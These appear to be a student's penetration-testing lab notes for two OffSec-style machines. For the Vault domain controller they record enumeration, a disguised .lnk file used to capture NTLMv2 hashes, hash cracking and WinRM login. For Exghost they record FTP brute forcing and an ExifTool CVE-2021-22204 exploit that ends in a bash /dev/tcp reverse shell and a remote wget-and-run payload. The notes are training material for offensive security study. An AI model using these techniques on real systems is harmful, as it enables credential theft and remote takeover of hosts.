
# Vault **192.168.205.172**

sudo nmap -vv --reason -sCV -p- -oN "./scans/nmap_open_tcp.txt" --min-rate=3000 192.168.205.172   
sudo nmap -vv --reason -Pn -T4 -sU --top-ports 20 -oN "./scans/nmap_UDP_20.txt" --open 192.168.205.172   

## Enumeration
### Initial Scans
```bash 
UDP nmap

```

```bash 
TCP nmap

```

- from open ports, we're seeing it's DC
- So enumerate AD ports..
## AD
- domain = vault.offsec aNY
- 192.168.205.172 vault.offsec
```bash

```

## DNS Enumeration
```bash
dig @192.168.205.172  vault.offsec any

; <<>> DiG 9.20.11-4+b1-Debian <<>> @192.168.205.172 vault.offsec any
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 44103
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;vault.offsec.                  IN      ANY

;; ANSWER SECTION:
vault.offsec.           600     IN      A       192.168.120.98
vault.offsec.           600     IN      A       192.168.120.116
vault.offsec.           3600    IN      NS      dc.vault.offsec.
vault.offsec.           3600    IN      SOA     dc.vault.offsec. hostmaster.vault.offsec. 34 900 600 86400 3600

;; ADDITIONAL SECTION:
dc.vault.offsec.        3600    IN      A       192.168.205.172

;; Query time: 23 msec
;; SERVER: 192.168.205.172#53(192.168.205.172) (TCP)
;; WHEN: Sat Oct 18 18:10:25 CEST 2025
;; MSG SIZE  rcvd: 153
```
### Try DNS XFER for zone transfer
```bash
dig @192.168.205.172  vault.offsec axfr
```

### SMB
```bash
# check for anonymous bind
nxc smb 192.168.205.172 -u "" -p "" --shares

# check for guest access 
nxc smb 192.168.205.172 -u "guest" -p "" --shares
SMB         192.168.205.172 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:False)
SMB         192.168.205.172 445    DC               [+] vault.offsec\guest: 
SMB         192.168.205.172 445    DC               [*] Enumerated shares
SMB         192.168.205.172 445    DC               Share           Permissions     Remark
SMB         192.168.205.172 445    DC               -----           -----------     ------
SMB         192.168.205.172 445    DC               ADMIN$                          Remote Admin
SMB         192.168.205.172 445    DC               C$                              Default share
SMB         192.168.205.172 445    DC               DocumentsShare  READ,WRITE      
SMB         192.168.205.172 445    DC               IPC$            READ            Remote IPC
SMB         192.168.205.172 445    DC               NETLOGON                        Logon server share 
SMB         192.168.205.172 445    DC               SYSVOL                          Logon server share 

# 
nxc smb 192.168.205.172 -u "guest" -p "" --generate-hosts-file ./scans/hosts



```
### 

## Forced Authentication & .lnk File abuse
- better than word macros as EDR and macro disablement is widespread in 2025
- aslo MoTW is a problem
-  WE can replace lnk files to point to a remote file
- we can also make lnk files use binary, to exeucte some command we want
- 
```bash

windows desktop 
new shortcut
%WINDIR% 
next
name: "payment.pdf"
finish

WE will change icon to look like PDF.
If target doesnt have show file extensions on, our LNK will look like a .pdf file

target
%ComSpec% /c echo pwned >%UserProfile\desktop\hacked.txt

# comspec is cmd.exe


change icon
path
\\192.168.1.1\test.ico
hit OK, there will be an error..

When user RENDERS icon, explorer.exe will try to fetch the icon.. no user-interaction required.
This provides us with a HASH, from the target user/computer

search google

generate force NTLMv2 Authentication files site:github.com

https://github.com/Greenwolf/ntlm_theft

This is allowed on OSCP as it is NOT automatic exploitation

```

```bash
# https://github.com/Greenwolf/ntlm_theft

python3 ntlm_theft.py -g all -s 192.168.45.245 -f payment.pdf


# responder is only in analyze mode, no poisoning or spoofing is being used
sudo responder -I tun0 -A


smbclient \\\\192.168.165.172\\DocumentsShare
put payment.pdf.lnk

# check responder, we should see NTLMv2 hit

hashcat hash /usr/share/wordlists/rockyou.txt

# NTLMv2 should be auto detected..
# if we can't crack, we can also relay

PASS: SecureHM

```

Now that we have a password, we should re-enumerate shares
```bash
nxc smb 192.168.205.172 -u "anirudh" -p "SecureHM" --shares

nxc winrm 192.168.205.172 -u "anirudh" -p "SecureHM" --shares

evil-winrm -i 192.168.205.172 -u "anirudh" -p "SecureHM" 


```



### OSCP Exam



---

# Exghost
## Enumeration
- start with ping, ttl can tell you what type of host it is, windows/linux, etc
- ping -c 1 192.168.50.10 ~ 64 *nix ~ 128 Windows ~ 254 Cisco devices
- sudo nmap -sCV -p- ip --min-rate=3000 --reason -v 
- sudo nmap -Pn -sU --top-ports 16 -T4 IP --reason
- https://github.com/UNICORDev/exploit-CVE-2021-22204
- https://github.com/AssassinUKG/CVE-2021-22204
- 


Open ports, 20,21,80
- standard web server
- browsing to web server
- use wappalyzer
```bash
run 
gobuster dir -u http://ip -w /seclists/raft-large-dir


```
Web server tech stack 
```bash
whatweb -v http://ip

curl -i http://ip/robots.txt/
curl -i http://ip/sitemap.xml/


```

FTP anonymous check
```bash
ftp IP
nothing
```

- Check apache vulns, : Apache 2.4.41 RCE
- Nothing interesting
- password guessing?
```bash

locate seclists | grep -i ftp

# colon separated wordlist
# /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt

hydra -C ftpbetterdefautlpass ftp://IP -I
# FOUND CREDS: user: system  
```
 FOUND CREDS: user: system
 - Login to ftp server
 ```bash
 ftp ip
 passive
 
 ls -la
 # we see backup file
 
 # This server is in binary mode. 
 # If we want to download txt document, switch to ascii
 
 get backup
 exit
  ```
- We've download backup
- check it `file backup`
- This is a packet capture, view in wireshark or tshark
- `wireshark backup`
- remove dns to make view easiser `!dns`
- we should now seee HTTP, TCP
- Follow TCP stream
- see exiftest.php upload
- There is a POST request, which is the endpoint
- Take the endpoint, and we can check the headers/body/etc
- THe pospt request is showing file upload, that is getting renamed, EXIFTOOL, and where it is uplaod to the server
- Info Disclosure on EXIFTOOl ver 12.23
- Search: exiftool 12.23 rce site:github.com
	- we our finding RCE/arbitrary code execution https://github.com/AssassinUKG/CVE-2021-22204
- check if we can access tool : ip/exiftest.php
- Try with CURL!!
```bash


  ```

## Manual Exploit 
- we our finding RCE/arbitrary code execution https://github.com/AssassinUKG/CVE-2021-22204
- Check if we can fully upload an image
- open start BURP
- use curl to port to endpoint
```
export http_proxy=http://127.0.0.1:8080/
# curl is designed to automatically check and respect the `http_proxy` environment variable.

curl -i http:/ip/

locate sample.png
cp sample.png .
open sample.png  # basic image

curl -i -F name=test.png -F myfile=@sample.png http://ip/exiftest.php -v -L
-i : headers
-F : post paramater
@ : try to upload file in PWD
-v : verbose
-L : follow redirects

```

new payload file - using ping to test for RCE, instead of REVSHELL.. just to validate this is working
``` 
(metadata "\c${system('pinc -c 3 192.168.KALIIP')};)
sudo tcpdump icmp -i tun0  # listen for icmp
```

```bash
# compresspayload
bzz payload payload.bzz
djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz

# you need config file from post..
# tells exif where to inject
exiftool -config config '-HassebladExif<=exploit.djvu' sample.png
string sample.png
# now we se djvu info on our paylod
```

send with curl
```bash
curl -i -F name=test.png -F myfile=@sample.png http://ip/exiftest.php -v -L
# should see ping request

```

Now that we now communication is working, we can replace payload of ping with revshell instead.
- some revshell payloads won't work if they have > & in them
- can try busybox nc, if it's present.
- can use this payload almost always
- ```bash
# start listener on kali: 
rlwrap nc -nvlp 4444

# revshells.com bash -i , copy to file named 'shell'
/bin/sh -i >& /dev/tcp/192.168.45.190/4444 0>&1

# In payload: update it to below, and recompile, and reupload/reinject 
# (metadata "\c${system('wget 192.168.KALIIP/shell -O /tmp/shell; bash /tmp/shell')};)
 
 curl -i -F name=test.png -F myfile=@sample.png http://ip/exiftest.php -v -L
 
  ```

exploit instead
```bash
python3 exploit-cve-20221-22204.py -c "wget 192.168.KALIIP/shell -O /tmp/shell; bash /tmp/shell"
```

